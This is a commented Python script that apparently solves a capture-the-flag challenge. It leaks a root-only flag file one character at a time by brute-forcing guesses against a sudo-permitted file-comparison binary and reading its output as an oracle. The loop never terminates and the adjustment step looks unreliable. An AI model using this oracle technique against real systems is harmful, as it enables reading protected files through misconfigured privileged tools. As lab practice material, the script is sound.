import string
import subprocess

charlist = string.printable # definig all printable characters
flag = ''

# ============================ PART 1
# This part construct the flag by appending the characters from charlist
# to the current flag variable, initially started empty

while True:

    for char in charlist:
        flag_attempt = flag + char


# ============================ PART 2
# The flag_attempt is writen here to the file1.txt
# used after to compare with the root.txt (root flag from the Hackingclub chall)            
# and It's encoded because the flag is represented, for example by something like: flag{1d2ds8f7az8s7d}       
        
        with open("file1.txt", "wb") as f:
            f.write(flag_attempt.encode())


# ============================ PART 3
# this part run the script with the expected arguments file1 and file2 to compare

        command = subprocess.Popen(
            ["sudo", "/root/bin_diff", "/root/root.txt", "file1.txt"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
# ============================ PART 4
# capture the binary output to process it later in the code

        output, error = command.communicate()
        command_output = output.decode()


# ============================ PART 5
# if the binary does not output the message: these files are not the same.
# It means the current guess if correct at this point

        if 'These files are not the same' not in command_output:
            print("Found char:", char, "Flag so far:", flag + char)
            flag += char
       

# ============================ PART 6
# handle an edge case where bin_diff provides more detailed output, 
# possibly containing a numeric difference indicator (like a mismatch index). 
# If the index is -1, it adjusts the character guess backward by one (chr(ord(char) - 1)).
        
        try:
            n = command_output.split(': ')[1].strip()

            if int(n) == -1:
                char = chr(ord(char) - 1)
                flag += char
                print("Adjusted char:", char, "Flag so far:", flag)
        
        except IndexError:
            print("Error parsing command output:", command_output)
